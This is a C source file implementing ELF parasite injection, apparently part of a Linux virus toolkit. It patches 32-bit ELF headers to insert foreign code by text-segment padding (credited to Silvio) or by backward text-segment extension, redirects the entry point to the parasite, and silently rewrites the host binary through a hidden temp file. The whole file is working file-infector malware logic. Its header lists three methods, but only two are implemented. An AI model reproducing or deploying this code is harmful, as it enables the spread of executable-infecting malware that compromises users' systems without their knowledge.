/*
This source code contains 3 methods of injection:
1. TEXT SEGMENT PADDING INJECTION
2. DATA SEGMENT INJECTION
3. TEXT ENTRY INFECTION
*/

#include "elfmod.h"

#define TMP ".zyx.tmp.bin"


struct stat st;
char *host;
unsigned long entry_point;
unsigned long old_e_entry;
unsigned long payload_entry;
Elf32_Addr TextPaddingInfect (unsigned int, unsigned char *, unsigned int, char *, int);
Elf32_Addr TextEntryInfect (unsigned int, unsigned char *, char *, int);

unsigned long inject_elf_binary(Elf32mem_t *target, uint8_t *parasite, int parasite_size, int jmp_code_offset, int method)
{
	
	int fd, i, c, text_found = 0;
	mode_t mode;
	
	uint8_t *mem = target->mem;
	host = target->name;

	memset(&st, 0, sizeof(struct stat));
	st.st_size = target->size;
	st.st_mode = target->mode;

	Elf32_Addr parasite_vaddr, text, end_of_text, end_of_parasite;
	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)mem;
	Elf32_Shdr *shdr = (Elf32_Shdr *)(mem + ehdr->e_shoff);
	Elf32_Phdr *phdr = (Elf32_Phdr *)(mem + ehdr->e_phoff);
	
	switch(method)
	{
	/* THE INFAMOUS TEXT PADDING INFECTION CONCEIVED BY SILVIO */
	case TEXT_PADDING_INFECTION:
	
	for (i = ehdr->e_phnum; i-- > 0; phdr++)
	{
		if (text_found)
		{
			phdr->p_offset += PAGE_SIZE;
			continue;
		}
		else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0)
		{
			/* ULTRA CONFIRMATION OF TEXT SEGMENT */
			if (phdr->p_flags == (PF_R | PF_X))
			{
				text = phdr->p_vaddr;
				
				/* parasite begins at the end of text */
				parasite_vaddr = phdr->p_vaddr + phdr->p_filesz;
				
				/* save and patch entry */
				if (jmp_code_offset != NO_JMP_CODE)
				{
					old_e_entry = ehdr->e_entry;
					ehdr->e_entry = parasite_vaddr;
				}
				/* save text length for later use */
				end_of_text = phdr->p_offset + phdr->p_filesz;

				/* increase memsz and filesz to account for new code */
				phdr->p_filesz += parasite_size;
				phdr->p_memsz += parasite_size;

				text_found++;
			}
		}
	}

	payload_entry = parasite_vaddr; 

	if (text_found == 0)
		return -1;

	/* increase size of any section that resides after injection by page size */
	shdr = (Elf32_Shdr *) (mem + ehdr->e_shoff);
	for (i = ehdr->e_shnum; i-- > 0; shdr++)
	{
		if (shdr->sh_offset >= end_of_text)
			shdr->sh_offset += PAGE_SIZE;
		else if (shdr->sh_size + shdr->sh_addr == parasite_vaddr)
			shdr->sh_size += parasite_size;

	}
	ehdr->e_shoff += PAGE_SIZE;
	return (TextPaddingInfect (parasite_size, mem, end_of_text, parasite, jmp_code_offset));
	
	/* TEXT ENTRY INFECTION (EXTEND TEXT SEGMENT BACKWARDS) */
	case TEXT_ENTRY_INFECTION:
       
	text_found = 0;
        entry_point = ehdr->e_entry;

        phdr = (Elf32_Phdr *)(mem + ehdr->e_phoff);
        phdr[0].p_offset += PAGE_SIZE;
        phdr[1].p_offset += PAGE_SIZE;

        for (i = ehdr->e_phnum; i-- > 0; phdr++)
        {
            if (text_found)
                   phdr->p_offset += PAGE_SIZE;

            if(phdr->p_type == PT_LOAD && phdr->p_offset == 0)
                 if (phdr->p_flags == (PF_R | PF_X))
                 {
                           phdr->p_vaddr -= PAGE_SIZE;
                           phdr->p_paddr -= PAGE_SIZE;
                           phdr->p_filesz += PAGE_SIZE;
                           phdr->p_memsz += PAGE_SIZE;
			   payload_entry = phdr->p_vaddr + sizeof(Elf32_Ehdr);
                           text_found = 1;
                 }
         }
	 
          shdr = (Elf32_Shdr *)(mem + ehdr->e_shoff);
          for (i = ehdr->e_shnum; i-- > 0; shdr++)
                 shdr->sh_offset += PAGE_SIZE;
 
          ehdr->e_shoff += PAGE_SIZE;
          ehdr->e_phoff += PAGE_SIZE;
 	  
	  return TextEntryInfect(parasite_size, mem, parasite, jmp_code_offset);

  	}
}

/* rewrite binary with text entry infection */
Elf32_Addr TextEntryInfect(unsigned int psize, unsigned char *mem, char *parasite, int jmp_code_offset)
{
	int ofd;
        unsigned int c;
        int i, t = 0, ehdr_size = sizeof(Elf32_Ehdr);
	
        if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
		return EFILE_ERR;

        if (write(ofd, mem, ehdr_size) != ehdr_size)
		return EFILE_ERR;

	if (jmp_code_offset != NO_JMP_CODE)
        *(unsigned long *)&parasite[jmp_code_offset] = entry_point;

        if (write(ofd, parasite, psize) != psize)
		return EFILE_ERR;
        
	if (lseek(ofd, ehdr_size + PAGE_SIZE, SEEK_SET) != ehdr_size + PAGE_SIZE)
		return EFILE_ERR;

        mem += ehdr_size;

        if (write(ofd, mem, st.st_size - ehdr_size) != st.st_size - ehdr_size)
		return EFILE_ERR;

        rename(TMP, host);
        close(ofd);
	return payload_entry;
}

/* rewrite binary with text padding infection */
Elf32_Addr TextPaddingInfect(unsigned int psize, unsigned char *mem, unsigned int end_of_text, char *parasite, int jmp_code_offset)
{

	int ofd;
	unsigned int c;
	int i, t = 0;

	if ((ofd = open (TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
		return EFILE_ERR;

	if (write (ofd, mem, end_of_text) != end_of_text)
		return EFILE_ERR;

	if (jmp_code_offset != NO_JMP_CODE)
	*(unsigned long *) &parasite[jmp_code_offset] = old_e_entry;

	if (write (ofd, parasite, psize) != psize)
		return EFILE_ERR;

	lseek (ofd, PAGE_SIZE - psize, SEEK_CUR);

	mem += end_of_text;

	unsigned int sum = end_of_text + PAGE_SIZE;
	unsigned int last_chunk = st.st_size - end_of_text;

	if (c = write (ofd, mem, last_chunk) != last_chunk)
		return EFILE_ERR;

	rename (TMP, host);
	close (ofd);

	/* return parasite entry point */
	return (payload_entry);
}
